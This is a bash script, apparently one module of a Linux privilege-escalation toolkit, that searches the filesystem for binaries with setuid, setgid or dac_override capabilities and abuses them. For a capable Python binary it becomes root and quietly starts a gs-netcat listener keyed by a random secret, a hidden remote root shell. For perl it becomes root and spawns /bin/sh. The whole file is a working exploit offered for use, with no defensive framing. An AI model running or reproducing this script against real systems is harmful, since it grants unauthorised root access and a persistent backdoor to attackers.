#!/bin/bash
source "$(dirname "$0")/00_common.sh"
METHOD="capabilities"
info "Checking capabilities..."
cap_bins=$(getcap -r / 2>/dev/null|grep -E 'cap_setuid|cap_setgid|cap_dac_override')
[ -z "$cap_bins" ] && { result_json "$METHOD" "skip" "No dangerous caps"; exit 1; }
echo "$cap_bins"|while read line; do
    bin=$(echo "$line"|cut -d' ' -f1)
    case "$(basename $bin)" in
        python*) secret=$(cat /dev/urandom|tr -dc 'a-z0-9'|head -c20); "$bin" -c "import os;os.setuid(0);os.system('nohup gs-netcat -s $secret -l -i &>/dev/null &')" 2>/dev/null && { result_json "$METHOD" "success" "$bin" "$secret"; exit 0; };;
        perl) "$bin" -e 'use POSIX qw(setuid);setuid(0);exec "/bin/sh"' 2>/dev/null;;
    esac
done
result_json "$METHOD" "fail" "No exploitable caps"; exit 1
